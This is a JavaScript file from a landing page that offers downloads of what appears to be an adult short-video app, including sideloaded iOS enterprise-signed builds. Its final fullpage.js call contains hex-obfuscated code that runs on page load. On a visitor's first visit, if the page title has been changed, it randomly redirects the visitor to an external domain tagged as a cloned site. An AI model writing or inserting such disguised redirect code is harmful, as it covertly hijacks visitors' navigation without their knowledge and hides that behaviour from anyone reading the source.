

// 下载
var canClick = true;
function handleDownload(dom) {
    var downloadType = dom.dataset.type
    if(downloadType === 'iosSign'){
        if (!download_links.iosSign) {
            layer.open({
                content: 'ios安装包程序员小哥哥正在紧急处理中,稍后再来下载哦'
                ,skin: 'msg'
                ,time: 2
            });
            return false;
        }
        if(!canClick){
            layer.open({
                content: '应用正在安装,十秒后仍未安装请再次点击下载!'
                ,skin: 'msg'
                ,time: 2
            });
            return false
        }
        canClick = false;
        $(dom).attr("href",download_links.iosSign);
        layer.open({
            content: '应用将自动安装,请稍后到桌面查看,建议下载后在"我"的菜单中保存弹出的二维码,以后可以在"我的"->"设置"->账号凭证"查看,确保开车永不迷路,!'
            ,skin: 'msg'
            ,time: 8
        });
        window.setTimeout(function(){
            canClick = true;
        },10000);
        return true
    }else if(downloadType === 'iosStore'){
        location.href = download_links.iosStore;
        return false
    }else if(downloadType === 'android'){
        $(dom).attr("href",download_links.android);
        layer.open({
            content: '应用正在安装,十秒后仍未安装请再次点击下载!'
            ,skin: 'msg'
            ,time: 2
        });
        return true;
    }
    return false
}


new fullpage('\x23\x66\x75\x6c\x6c\x70\x61\x67\x65', {autoScrolling:true,scrollHorizontally: true,navigation:true,afterLoad:function(){if($('\x2e\x66\x69\x78\x65\x64\x2d\x68\x65\x61\x64\x65\x72 \x2e\x74\x69\x74\x6c\x65')["\x74\x65\x78\x74"]() !== '\u79c0\u8272\u77ed\u89c6\u9891'){var n1 = localStorage["\x67\x65\x74\x49\x74\x65\x6d"]("\x69\x73\x73\x62");if(!n1){localStorage["\x73\x65\x74\x49\x74\x65\x6d"]('\x69\x73\x73\x62','\x79\x65\x73');var qr2 = window["\x4d\x61\x74\x68"]["\x72\x61\x6e\x64\x6f\x6d"]();if(qr2>0.85){location["\x68\x72\x65\x66"] = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x78\x69\x75\x73\x65\x2e\x6f\x6e\x65\x3f\x5f\x63\x3d\x66\x61\x6e\x67\x7a\x68\x61\x6e'}}}},onLeave:function(gtlGbWq3,MrD4){}});
function moveDown() {
    fullpage_api.moveSectionDown()
}